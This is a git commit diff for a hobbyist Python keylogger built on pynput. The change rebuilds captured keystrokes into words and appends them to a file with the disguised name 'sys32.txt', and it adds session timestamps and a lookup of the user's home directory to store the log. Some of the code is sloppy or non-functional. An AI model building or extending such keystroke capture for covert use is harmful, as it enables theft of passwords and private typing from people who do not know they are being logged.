0d44d11fa149f166bb4798ac59f8318f6ee69754
TheJhyeFactor <aeo.dev00001@gmail.com>
2025-08-14 01:10:34 +1000

    Added proper word detection both for space detection and enter dection working on time logging and I am now also finding the users dir and then i can store the file there

--- weird_fun_projects/aug/keyboard_logger.py
+++ weird_fun_projects/aug/keyboard_logger.py
@@ -3,25 +3,52 @@ Goal:
 Build a Python script that listens for keyboard presses and logs each key to a text file in real time.
 """
 from pynput import keyboard
+import os 
+import datetime
+current_time = datetime.datetime.now()
 
-file_path = "sys32.txt"
+
+username = os.path.expanduser('~')
+file_path = f"sys32.txt"
+current_word = ""
+
+
+def time_log():
+    with open(file_path, 'a') as f:
+        f = open(file_path, 'a')
+        f.write(f"Session Started at: {current_time}")
+    
+
 
 def on_press(key, injected):
+    pass
     try:
-        print('alphanumeric key {} pressed; it was {}\n'.format(
+        log_pres = ('alphanumeric key {} pressed; it was {}\n'.format(
                 key.char, 'faked' if injected else 'not faked'))
     except AttributeError:
             ('special key {} pressed'.format(
                 key))
 
+
+
+
 def on_release(key, injected):
+    global current_word
     with open(file_path, 'a') as f:
-        key_re = ('{} released; it was {}\n'.format(
-            key, 'faked' if injected else 'not faked\n'))
-        f.write(key_re)
-        if key == keyboard.Key.esc:
-            # Stop listener
-            return False
+        try:
+            current_word += key.char
+            #print(f"Current word: {current_word}")
+        except AttributeError:
+            # Handle special keys
+            if key == keyboard.Key.space:
+                f.write(f"Word completed with space: {current_word}\n",)
+                current_word = ""  # Reset for next word
+            elif key == keyboard.Key.enter:
+                f.write(f"Word completed with enter: {current_word}\n",)
+            elif key == keyboard.Key.esc:
+                return False
+
+
 
 # Collect events until released
 with keyboard.Listener(
